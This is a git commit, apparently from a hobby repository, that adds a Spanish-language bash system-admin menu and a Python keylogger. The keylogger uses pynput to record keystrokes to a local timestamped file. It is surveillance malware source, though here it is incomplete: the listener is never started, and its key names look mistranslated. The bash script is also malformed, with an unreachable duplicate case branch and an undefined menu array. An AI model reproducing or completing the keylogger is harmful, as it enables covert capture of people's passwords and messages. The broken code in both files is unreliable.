c1a6007fab0c63ce5d548960cd58265c006c1480
edfuenzalida <edfuenzalidag@gmail.com>
2023-03-30 20:06:29 -0300

    Agregando directorios bash y python...

---
+++ bash/adm_system_menu.sh
@@ -0,0 +1,91 @@
+#!/bin/bash
+# Version 1.2.2
+# Fecha 25.11.2022
+# by edrox
+
+PS3="
+Ingrese una opción: "
+
+while true; do
+
+    echo
+
+    select opc in "${menu[@]}" Salir
+        
+        do
+
+            case $REPLY in
+
+            1)
+                echo
+#               echo "Actual espacio consumido en Caché: " 
+                sudo sh -c 'echo 3 >/proc/sys/vm/drop_caches'
+                echo "Limpiando memoria cache"
+                echo
+                echo "Limpieza realizada...."
+                exit
+            break 2;;
+
+
+                echo "*******************************"
+                echo "Limpiando memoria cache"
+                echo "*******************************"
+                sleep 2
+                echo "Limpieza realizada...."
+                echo "*******************************"
+                echo
+                exit
+            break 2;;
+
+            2)
+                echo
+                sudo dnf upgrade -y
+                echo "********************************"
+                echo
+                echo "Sistema actualizado....."
+                echo
+                echo "********************************"
+                echo
+                exit
+            break 2;;
+
+            3)
+                echo
+                df_answer=`df -h .`
+                echo "********************************"
+                echo
+                echo "Espacio en disco local: "
+                echo
+                echo "$df_answer"
+                echo
+                echo "********************************"
+                echo
+                exit
+            break 2;;
+                
+            $((${#menu[@]}+1)))
+
+                echo
+                echo "---------------------------"
+                echo
+                echo "See you later bro!... :3"
+                echo
+                echo "---------------------------"
+            break 2;;            
+
+            *)
+                echo
+                echo "---------------------------"
+                echo
+                echo "Menú ingresado no existente"
+                echo "Favor leer el menú e introducir un menù existente"
+                echo
+                echo "---------------------------"
+                echo
+    
+            break;;
+            
+    esac
+  done            
+done
+
---
+++ python/keylogger.py
@@ -0,0 +1,24 @@
+#En este código 
+
+import datetime
+from pynput.keyboard import Listener
+
+x = datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S')
+
+p = open(f'keylogger_{x}.txt', 'w')
+
+def registro(llave):
+
+    llave = str(llave)
+
+    if llave == "'\\x03'":
+        p.close()
+        quit()
+    elif llave == 'Llave.enter':
+        p.write('\n')
+    elif llave == 'Llave.space':
+        p.write(' ')
+    elif llave == 'Llave.backspace':
+        p.write('%BORRAR')
+    else:
+        p.write(llave.replace("",""))    
